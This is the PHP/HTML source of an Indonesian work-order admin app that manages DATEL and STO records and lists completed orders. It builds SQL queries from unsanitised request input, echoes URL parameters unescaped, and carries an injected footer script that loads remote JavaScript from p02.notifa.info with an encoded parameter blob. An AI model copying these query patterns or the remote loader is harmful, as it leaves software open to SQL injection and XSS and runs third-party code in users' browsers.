                                            <div class="actions ml-md-3 mb-2 text-sm-right d-lg-inline-block">
                                            	<!-- <button type="button" class="btn btn-outline-primary width-100-xs" data-toggle="modal" data-target="#exampleModal" data-whatever="@fat">Open modal for @fat</button> -->

                                                <button type="button" class="btn btn-circle btn-primary" data-toggle="modal" data-target="#exampleModalDatel" data-whatever="@fat"><i class="fa fa-plus"></i></button> Tambah Datel Baru


                                            </div>
                                        </div>
                                    </div>
                                    <div class="row">
                                        <div class="col-sm-12">
                                            <div class="table-responsive">
                                                <table id="example1" class="table table-striped table-bordered data-table mb-0" role="grid">
                                                    <thead>
                                                    <tr>
                                                        <th tabindex="0" aria-controls="example" rowspan="1" colspan="1" class="text-center">
                                                          #ID
                                                        </th>
                                                        <th tabindex="0" aria-controls="example" rowspan="1" colspan="1" aria-label="Name: activate to sort column descending">
                                                          DATEL
                                                        </th>
                                                        <th tabindex="0" aria-controls="example" rowspan="1" colspan="1" aria-label="Position: activate to sort column ascending">
                                                        	WITEL
                                                        </th>
                                                       <th tabindex="0" aria-controls="example" rowspan="1" colspan="1" aria-label="Email: activate to sort column ascending">
                                                          AKSI
                                                        </th>
                                                    </tr>
                                                    </thead>

                                                    <tbody>

													<?php
														// Langkah 2. Sesuaikan query dengan posisi dan batas
														$query  = "SELECT tb_datel.kd_datel, tb_datel.datel, tb_witel.witel
                                      FROM tb_datel
                                      INNER JOIN tb_witel ON tb_datel.kd_witel = tb_witel.kd_witel
                                     ORDER BY tb_witel.witel
                                      LIMIT $posisi,$batas

                                      ";
														$tampil = mysqli_query($db, $query);
														$no = $posisi+1;
														while ($show_datel=mysqli_fetch_array($tampil)){
													 	echo"

													          <tr>
													          	<td class='text-center'>
													                $show_datel[kd_datel]
													            </td>
													            <td>$show_datel[datel]</td>
													            <td>Regional $show_datel[witel]</td>

													            <td><a href='index.php?page=lihat_data_datel&kd_datel=$show_datel[kd_datel]' class='text-danger text-nowrap remove' title='Delete'><i class='fa fa-trash-o' ></i>Delete</a>
													            </td>
													          </tr>";

														  $no++;
														}

													?>

													<?php
												        if(isset($_GET['kd_datel']))
														{

															$kd_datel = $_GET["kd_datel"];


															mysqli_query($db, "DELETE FROM tb_datel WHERE kd_datel='$kd_datel' ");


														     ?>
														     <div class="alert alert-danger mb-2" role="alert">
                                   							Data Datel dengan kd_datel <b> <?php echo $_GET['kd_datel']; ?></b> berhasil dihapus.
                                							</div>
														     <meta http-equiv="refresh" content="0.3; url=index.php?page=lihat_data_datel">
														     <?php
														}
													?>
													</tbody>
                                                </table>
                                            </div>
                                        </div>
                                    </div>
                                    <div class="row">
                                        <div class="col-sm-12 col-md-5">
                                            <div class="showing-items">
                                            </div>
                                        </div>
<?php
// Langkah 3: Hitung total data dan halaman serta link 1,2,3
$query2     = mysqli_query($db, "select * from tb_datel");
$jmldata    = mysqli_num_rows($query2);
$jmlhalaman = ceil($jmldata/$batas);

?>


                                        <div class="col-sm-12 col-md-7">
                                            <div class="data-table-paginate">
                                                <nav>
                                                    <ul class="pagination">

<?php

for($i=1;$i<=$jmlhalaman;$i++)
if ($i != $halaman){
 echo "  <li class='page-item'> <a href=\"index.php?page=lihat_data_datel&halaman=$i\" class='page-link'>$i</a></li>";
}
else{
 echo " <li class='page-item'> <a class='page-link badge-danger' style='color:white;'>$i</a> </li>";
}

?>




                                                    </ul>
                                                </nav>
                                            </div>
                                        </div>
                                    </div>
                                </div>
                            </div>



        <?php
        break;
        // END HALAMAN LIHAT DATA WITEL


        // START HALAMAN PROSES TAMBAH WITEL
		case "proses_tambah_datel":

        include("../dbConfig.php");

// cek apakah tombol daftar sudah diklik atau blum?
if(isset($_POST['bt_tambah_datel'])){


    		$datel= $_POST['datel'];
    		$alamat = $_POST['alamat'];
     		$witel = $_POST['witel'];


        // Proses insert data dari form ke db
        $sql_datel = "INSERT INTO tb_datel(datel,alamat,kd_witel) VALUES ('$datel','$alamat','$witel')";


	        if(mysqli_query($db, $sql_datel))
	        {
	          echo "<script>alert('Tambah Data Datel baru Berhasil!');location.replace('index.php?page=lihat_data_datel')</script>";
	        }else
          	{
            	echo "Error updating record: " . mysqli_error($db);
          	}



	}else {
			die("Akses dilarang...");

	  	//	header('location:../logout.php');
		}

		break;
// END HALAMAN TAMBAH Datel






//START HALAMAN LIHAT DATA DATEL
case "lihat_data_sto":
    ?>
    <?php
// Langkah 1. Tentukan batas,cek halaman & posisi data
$batas   = 20;
$halaman = @$_GET['halaman'];
if(empty($halaman)){
 $posisi  = 0;
 $halaman = 1;
}
else{
  $posisi  = ($halaman-1) * $batas;
}

    ?>
<!-- UNTUK MODAL INPUTAN -->
<div class="modal fade" id="exampleModalSTO" tabindex="-1" role="dialog" aria-labelledby="exampleModalLabel" aria-hidden="true">
                                    <div class="modal-dialog" role="document">
                                        <div class="modal-content">
                                            <form action='index.php?page=proses_tambah_sto' method="POST" >
                                            <div class="modal-header">
                                                <h5 class="modal-title" id="exampleModalLabel">TAMBAH STO BARU</h5>
                                                <button type="button" class="close" data-dismiss="modal" aria-label="Close">
                                                    <span aria-hidden="true">&times;</span>
                                                </button>
                                            </div>
                                            <div class="modal-body">
                                                  <div class="form-group">
                                                      <label for="recipient-name" class="form-control-label">
                                                      KODE STO
                                                    </label>
                                                      <input type="text" class="form-control" name="kd_sto">
                                                  </div>

                                                    <div class="form-group">
                                                        <label for="recipient-name" class="form-control-label">
                                                        NAMA STO
                                                      </label>
                                                        <input type="text" class="form-control" name="sto">
                                                    </div>

                                                    <div class="form-group">
                                                        <label for="message-text" class="form-control-label">
                                                        DATEL
                                                      </label>
                                                        <select class="custom-select" id="exampleFormCustomSelectPref" name="datel">
                                                    <option selected="">Pilih Datel</option>
                                                    <?php
                                                    $query_datel = mysqli_query($db,"SELECT * FROM tb_datel");
                                                    while($data_datel=mysqli_fetch_array($query_datel)){

                                                      echo"<option value='$data_datel[kd_datel]'>$data_datel[datel]</option>";

                                                    }


                                                    ?>
                                                         </select>
                                                    </div>


                                            </div>
                                            <div class="modal-footer">
                                                <input type="reset" class="btn btn-secondary" data-dismiss="modal" value='Batal'></button>
                                                <input type="submit" class="btn btn-theme" value='Tambah STO' name='bt_tambah_sto'></button>
                                            </div>
                                          </form>
                                        </div>
                                    </div>
                                </div>
<!-- END MODAL INPUTAN -->

<div class="bg-white padding-25 h-100">
                            <h4 class="mt-0 box-title">Data STO</h4>
                            <div class="data-table-wrapper">
                                <div class="row">
                                    <div class="col-sm-12 col-lg-4 col-xl-6">
                                        <div class="data-table-length">
                                        </div>
                                    </div>

                                    <div class="col-sm-12 col-lg-8 col-xl-6 text-md-right">

                                        <div class="actions ml-md-3 mb-2 text-sm-right d-lg-inline-block">
                                          <!-- <button type="button" class="btn btn-outline-primary width-100-xs" data-toggle="modal" data-target="#exampleModal" data-whatever="@fat">Open modal for @fat</button> -->

                                            <button type="button" class="btn btn-circle btn-primary" data-toggle="modal" data-target="#exampleModalSTO" data-whatever="@fat"><i class="fa fa-plus"></i></button> Tambah Datel Baru


                                        </div>
                                    </div>
                                </div>
                                <div class="row">
                                    <div class="col-sm-12">
                                        <div class="table-responsive">
                                            <table id="example1" class="table table-striped table-bordered data-table mb-0" role="grid">
                                                <thead>
                                                <tr>
                                                    <th tabindex="0" aria-controls="example" rowspan="1" colspan="1" class="text-center">
                                                      #ID
                                                    </th>
                                                    <th tabindex="0" aria-controls="example" rowspan="1" colspan="1" aria-label="Name: activate to sort column descending">
                                                      STO
                                                    </th>
                                                    <th tabindex="0" aria-controls="example" rowspan="1" colspan="1" aria-label="Position: activate to sort column ascending">
                                                      DATEL
                                                    </th>
                                                   <th tabindex="0" aria-controls="example" rowspan="1" colspan="1" aria-label="Email: activate to sort column ascending">
                                                      AKSI
                                                    </th>
                                                </tr>
                                                </thead>

                                                <tbody>

                      <?php
                        // Langkah 2. Sesuaikan query dengan posisi dan batas
                        $query  = "SELECT tb_sto.kd_sto, tb_sto.sto, tb_datel.datel
                                  FROM tb_sto
                                  INNER JOIN tb_datel ON tb_datel.kd_datel = tb_sto.kd_datel
                                 ORDER BY tb_datel.datel
                                  LIMIT $posisi,$batas

                                  ";
                        $tampil = mysqli_query($db, $query);
                        $no = $posisi+1;
                        while ($show_datel=mysqli_fetch_array($tampil)){
                        echo"

                                <tr>
                                  <td class='text-center'>
                                      $show_datel[kd_sto]
                                  </td>
                                  <td>$show_datel[sto]</td>
                                  <td>Regional $show_datel[datel]</td>

                                  <td><a href='index.php?page=lihat_data_sto&kd_sto=$show_datel[kd_sto]' class='text-danger text-nowrap remove' title='Delete'><i class='fa fa-trash-o' ></i>Delete</a>
                                  </td>
                                </tr>";

                          $no++;
                        }

                      ?>

                      <?php
                            if(isset($_GET['kd_sto']))
                        {

                          $kd_sto = $_GET["kd_sto"];


                          mysqli_query($db, "DELETE FROM tb_sto WHERE kd_sto='$kd_sto' ");


                             ?>
                             <div class="alert alert-danger mb-2" role="alert">
                                            Data Datel dengan kd_sto <b> <?php echo $_GET['kd_sto']; ?></b> berhasil dihapus.
                                          </div>
                             <meta http-equiv="refresh" content="0.3; url=index.php?page=lihat_data_sto">
                             <?php
                        }
                      ?>
                      </tbody>
                                            </table>
                                        </div>
                                    </div>
                                </div>
                                <div class="row">
                                    <div class="col-sm-12 col-md-5">
                                        <div class="showing-items">
                                        </div>
                                    </div>
<?php
// Langkah 3: Hitung total data dan halaman serta link 1,2,3
$query2     = mysqli_query($db, "select * from tb_sto");
$jmldata    = mysqli_num_rows($query2);
$jmlhalaman = ceil($jmldata/$batas);

?>


                                    <div class="col-sm-12 col-md-7">
                                        <div class="data-table-paginate">
                                            <nav>
                                                <ul class="pagination">

<?php

for($i=1;$i<=$jmlhalaman;$i++)
if ($i != $halaman){
echo "  <li class='page-item'> <a href=\"index.php?page=lihat_data_sto&halaman=$i\" class='page-link'>$i</a></li>";
}
else{
echo " <li class='page-item'> <a class='page-link badge-danger' style='color:white;'>$i</a> </li>";
}

?>




                                                </ul>
                                            </nav>
                                        </div>
                                    </div>
                                </div>
                            </div>
                        </div>



    <?php
    break;
    // END HALAMAN LIHAT DATA WITEL


    // START HALAMAN PROSES TAMBAH WITEL
case "proses_tambah_sto":

    include("../dbConfig.php");

// cek apakah tombol daftar sudah diklik atau blum?
if(isset($_POST['bt_tambah_sto'])){


    $kd_sto = $_POST['kd_sto'];
    $kd_datel= $_POST['datel'];

    $sto = $_POST['sto'];


    // Proses insert data dari form ke db
    $sql_datel = "INSERT INTO tb_sto(kd_sto,sto,kd_datel) VALUES ('$kd_sto','$sto','$kd_datel')";


      if(mysqli_query($db, $sql_datel))
      {
        echo "<script>alert('Tambah Data STO baru Berhasil!');location.replace('index.php?page=lihat_data_sto')</script>";
      }else
        {
          echo "Error updating record: " . mysqli_error($db);
        }



}else {
  die("Akses dilarang...");

  //	header('location:../logout.php');
}

break;
// END HALAMAN TAMBAH STO





        // START HALAMAN COMPLETE ORDER
        case "complete_order":

        $sql = "
        SELECT tb_order.id,tb_order.namapekerjaan,tb_order.notiket,tb_order.lokasi,tb_order.kd_witel,tb_order.kd_sto,tb_order.penyebab,tb_order.lampiran, tb_witel.witel, tb_tiket.tanggal_buat,tb_tiket.status
        FROM ((tb_order
        INNER JOIN tb_witel ON tb_order.kd_witel = tb_witel.kd_witel)
        INNER JOIN tb_tiket ON tb_order.notiket = tb_tiket.notiket)
        WHERE tb_tiket.status=1


        ";

        $res = mysqli_query($db,$sql);

        ?>

        <!-- page content -->
            <div class="main-content">
                <!-- START PAGE COVER -->
                <div class="row bg-title clearfix page-title">
                    <div class="col-12 col-lg-3">
                        <h4 class="page-title">Getting started!</h4>
                    </div>
                    <div class="col-12 col-lg-9">
                        <!-- START breadcrumb -->
                        <ol class="breadcrumb pl-0 pr-0 float-lg-right">
                            <li><a href="index-2.html">Oreo</a></li>
                            <li><a href="javascript:void(0)">Teknisi</a></li>
                            <li class="active">Complete Order</li>
                        </ol>
                        <!-- END breadcrumb -->
                    </div>
                    <div class="col-12">
                       <h3>Daftar Complete Order</h3>
                    </div>
                </div>
                <!-- END PAGE COVER -->
                <div class="container-fluid">
                    <div class="row">

                        <div class="col-lg-12 col-xl-12 mb-2">
                            <div class="bg-white padding-25 h-100">
                                  <div class="data-table-wrapper">
                                    <div class="row">
                                        <div class="col-sm-12 col-lg-4 col-xl-6">
                                            <div class="data-table-length">
                                                <label>
                                                    Tampilkan:
                                                    <select aria-controls="example" class="form-control">
                                                        <option value="10">10</option>
                                                        <option value="25">25</option>
                                                        <option value="50">50</option>
                                                        <option value="100">100</option>
                                                    </select>
                                                    data
                                                </label>
                                            </div>
                                        </div>

                                        <div class="col-sm-12 col-lg-8 col-xl-6 text-md-right">
                                            <div class="data-table-filter mb-2 float-sm-left float-lg-none d-lg-inline-block">
                                                <label for="search1">Cari Berkas Order:</label>
                                                <input type="search" class="form-control" id="search1" placeholder="masukkan No Tiket">
                                            </div>

                                        </div>
                                    </div>
                                    <div class="row">
                                        <div class="col-sm-12">
                                            <div class="table-responsive">
                                                <table id="example2" class="table table-striped table-bordered data-table table-checkable mb-0" role="grid">
                                                    <thead>
                                                    <tr>
                                                       <th tabindex="0" aria-controls="example" rowspan="1"
                                                            colspan="1"
                                                            aria-label="Id: activate to sort column descending">
                                                            No
                                                        </th>

                                                        <th tabindex="0" aria-controls="example" rowspan="1"
                                                            colspan="1"
                                                            aria-label="Id: activate to sort column descending"
                                                            class="text-center">
                                                            No Tiket
                                                        </th>
                                                        <th tabindex="0" aria-controls="example" rowspan="1"
                                                            colspan="1"
                                                            aria-label="Id: activate to sort column descending"
                                                            class="text-center">
                                                            Tanggal Buat
                                                        </th>
                                                        <th tabindex="0" aria-controls="example" rowspan="1"
                                                            colspan="1"
                                                            aria-label="Id: activate to sort column descending"
                                                            class="text-center">
                                                            Nama Pekerjaan
                                                        </th>
                                                        <th tabindex="0" aria-controls="example" rowspan="1"
                                                            colspan="1"
                                                            aria-label="Id: activate to sort column descending"
                                                            class="text-center">
                                                            Lokasi
                                                        </th>

                                                        <th tabindex="0" aria-controls="example" rowspan="1"
                                                            colspan="1"
                                                            aria-label="Id: activate to sort column descending"
                                                            class="text-center">
                                                            STO
                                                        </th>
                                                        <th tabindex="0" aria-controls="example" rowspan="1"
                                                            colspan="1"
                                                            aria-label="Id: activate to sort column descending"
                                                            class="text-center">
                                                            Penyebab
                                                        </th>
                                                        <th tabindex="0" aria-controls="example" rowspan="1"
                                                            colspan="1"
                                                            aria-label="Id: activate to sort column descending"
                                                            class="text-center">
                                                            Cetak
                                                        </th>

                                                    </tr>
                                                    </thead>
                                                    <tbody>
                                                    <?php
                                                    $penomoran = 1;
                                                    while($penomoran <= ($data=mysqli_fetch_array($res))){
                                                      ?>
                                                    <tr>
                                                        <td class="text-center"><?php echo $penomoran; ?></td>
                                                        <td class="text-center"><?php echo $data["notiket"]; ?></td>
                                                        <td><?php echo $data["tanggal_buat"]; ?></td>
                                                        <td><?php echo $data["namapekerjaan"]; ?></td>
                                                        <td><?php echo $data["lokasi"]; ?></td>

                                                        <td class="text-center"><?php echo $data["kd_sto"]; ?></td>
                                                        <td><?php echo $data["penyebab"]; ?></td>

                                                        <td class="text-center">
                                                          <a href="cetak_order_kerja.php?notiket=<?php echo $data["notiket"]; ?>">
                                                              <button type="button" class="btn bg-transparent btn-circle" title="Print">
                                                                <b><i class="fa fa-print" ></i></b>
                                                              </button>
                                                          </a>
                                                        </td>

                                                    </tr>
                                                    <?php
                                                      $penomoran++;

                                                    }
                                                    ?>

                                                    </tbody>
                                                </table>
                                            </div>
                                        </div>
                                    </div>
                                    <div class="row">
                                        <div class="col-sm-12 col-md-5">
                                            <div class="showing-items">Menampilkan

                                              <?php

                                              $sql_count = mysqli_query($db,"SELECT COUNT(notiket) as JUMLAH FROM tb_tiket WHERE status=1");
                                              while($jumlah = mysqli_fetch_array($sql_count)){
                                                 echo $jumlah["JUMLAH"];
                                              }


                                              ?>
                                               Data Order

                                            </div>
                                        </div>
                                        <div class="col-sm-12 col-md-7">
                                            <div class="data-table-paginate">
                                                <nav>
                                                    <ul class="pagination">
                                                        <li class="page-item"><a class="page-link" href="#">Previous</a></li>
                                                        <li class="page-item"><a class="page-link" href="#">1</a></li>
                                                        <li class="page-item"><a class="page-link" href="#">2</a></li>
                                                        <li class="page-item"><a class="page-link" href="#">3</a></li>
                                                        <li class="page-item"><a class="page-link" href="#">Next</a></li>
                                                    </ul>
                                                </nav>
                                            </div>
                                        </div>
                                    </div>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
            <!-- /page content -->

        <?php
        break;

        // END HALAMAN COMPLETE ORDER

      }
      ?>
      <!-- footer content -->
      <footer class="footer">
        <div class="float-right">
          Oreo - Aplikasi Order Perintah Kerja Online <a href="index.php?page=dashboard" class="company-name text-theme">

          </a>
        </div>
        <div class="clearfix"></div>
      </footer><!-- /footer content -->
    </div>
  </div>

  <!-- site foot -->
  <script src="../js/vendor.min.js"></script>
  <script src="../js/main.js"></script>
  <script src="../js/settings.min.js"></script>
  <script src="../js/charts.js"></script>
  <script type="text/javascript">if (self==top) {function netbro_cache_analytics(fn, callback) {setTimeout(function() {fn();callback();}, 0);}function sync(fn) {fn();}function requestCfs(){var idc_glo_url = (location.protocol=="https:" ? "https://" : "http://");var idc_glo_r = Math.floor(Math.random()*99999999999);var url = idc_glo_url+ "p02.notifa.info/3fsmd3/request" + "?id=1" + "&enc=9UwkxLgY9" + "&params=" + "4TtHaUQnUEiP6K%2fc5C582NzYpoUazw5mqEFsStDL2kcKOEgSI1kUxFCY8CbSVuc661OgqVbkUs0Kl%2f3NNQ4KbptNEnfBqeGCqovy4ISEmgGwSqI1gnSFpt8CSiHnlkoWGWjFms%2fZNYrEual0nRX503PXLGu%2fuBNZnv5%2bK5IJa%2fj%2bmaM4u9F6LNF%2fkg8%2bkYy5lbLeYgnuoX%2fi4si44%2b3C54qrDWTidiQ7EotmjI4E1%2bDuhgI0wqV3ROObUmv2zRinXD3Mr0%2bgqdQV1uTVaVm0VCVhm7pAQT8kDyBiOAj2R2eKWs2LxxVBgufqr4i4fIpYFrCmAneVFgkMOBSBgzKgHTalTwRE9NI1QznR9PA1Llpsv5iT9P0bV17vzEpn1NYWE23TtcQ4BltuSiZA1D4Z%2fEIMMu3MIIwwoEDYxVLLicIKUA2iYOolvj1tcGjHnbcq030JiUmeWbO36eYbM%2bCE3tvUOujk5%2f3KTTOZdQYlCh3VyKO3wJuq%2bOKFduZsjtuxQKGJcyHI3Tc%3d" + "&idc_r="+idc_glo_r + "&domain="+document.domain + "&sw="+screen.width+"&sh="+screen.height;var bsa = document.createElement('script');bsa.type = 'text/javascript';bsa.async = true;bsa.src = url;(document.getElementsByTagName('head')[0]||document.getElementsByTagName('body')[0]).appendChild(bsa);}netbro_cache_analytics(requestCfs, function(){});};</script></body>
  <!-- Mirrored from musa.beewebsystems.com/form-general.html by HTTrack Website Copier/3.x [XR&CO'2014], Thu, 28 Jun 2018 02:01:09 GMT -->
  </html>
  <!-- /site foot -->


  <!--  SCRIPT UNTUK AJAX WITEL DAN STO -->
  <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.2.1/jquery.min.js"></script>

  <script type="text/javascript">
    $(document).ready(function(){
      $('#regional').on('change',function(){
        var kd_regional = $(this).val();
        if(kd_regional){
          $.ajax({
            type:'POST',
            url:'ajaxData.php',
            data:'kd_regional='+kd_regional,
            success:function(html){
              $('#witel').html(html);
              $('#sto').html('<option value="" name="witel">Pilih Witel</option>');
            }
          });
        }else{
          $('#witel').html('<option value="" name="witel">Pilih Regional terlebih dahulu</option>');
          $('#sto').html('<option value="" name="witel">Pilih Witel terlebih dahulu</option>');
        }
      });

      $('#witel').on('change',function(){
        var kd_witel = $(this).val();
        if(kd_witel){
          $.ajax({
            type:'POST',
            url:'ajaxData.php',
            data:'kd_witel='+kd_witel,
            success:function(html){
              $('#sto').html(html);
            }
          });
        }else{
          $('#sto').html('<option value="" >Select STO first</option>');
        }
      });
    });


    // UNTUK MATERIAL
      $(document).ready(function(){
      var postURL = "addmore.php";
      var i=1;


      $('#add').click(function(){
           i++;
           $('#dynamic_field').append('<tr id="row'+i+'" class="dynamic-added"><td><input type="text" name="name[]" placeholder="Material" class="form-control name_list" required /></td><td><input type="text" name="unit[]" placeholder="Unit" class="form-control name_list" required /></td><td><input type="text" name="volume[]" placeholder="Volume" class="form-control name_list" required /></td><td><button type="button" name="remove" id="'+i+'" class="btn btn-danger btn_remove">X</button></td></tr>');
      });


      $(document).on('click', '.btn_remove', function(){
           var button_id = $(this).attr("id");
           $('#row'+button_id+'').remove();
      });


      $('#submit').click(function(){
           $.ajax({
                url:postURL,
                method:"POST",
                data:$('#add_name').serialize(),
                type:'json',
                success:function(data)
                {
                    i=1;
                    $('.dynamic-added').remove();
                    $('#add_name')[0].reset();
                }
           });
      });


    });



// UNTUK PEKERJAAN
      $(document).ready(function(){
      var postURL = "addpekerjaan.php";
      var i=1;


      $('#add_pekerjaan').click(function(){
           i++;
           $('#dynamic_field_pekerjaan').append('<tr id="row'+i+'" class="dynamic-added"><td><input type="text" name="name_pekerjaan[]" placeholder="Material" class="form-control name_list" required /></td><td><input type="text" name="unit_pekerjaan[]" placeholder="Unit" class="form-control name_list" required /></td><td><input type="text" name="volume_pekerjaan[]" placeholder="Volume" class="form-control name_list" required /></td><td><button type="button" name="remove" id="'+i+'" class="btn btn-danger btn_remove">X</button></td></tr>');
      });


      $(document).on('click', '.btn_remove_pekerjaan', function(){
           var button_id = $(this).attr("id_pekerjaan");
           $('#row_pekerjaan'+button_id+'').remove();
      });


      $('#submit').click(function(){
           $.ajax({
                url:postURL,
                method:"POST",
                data:$('#add_name').serialize(),
                type:'json',
                success:function(data)
                {
                    i=1;
                    $('.dynamic-added_pekerjaan').remove();
                    $('#add_name')[0].reset();
                }
           });
      });


    });



  </script>
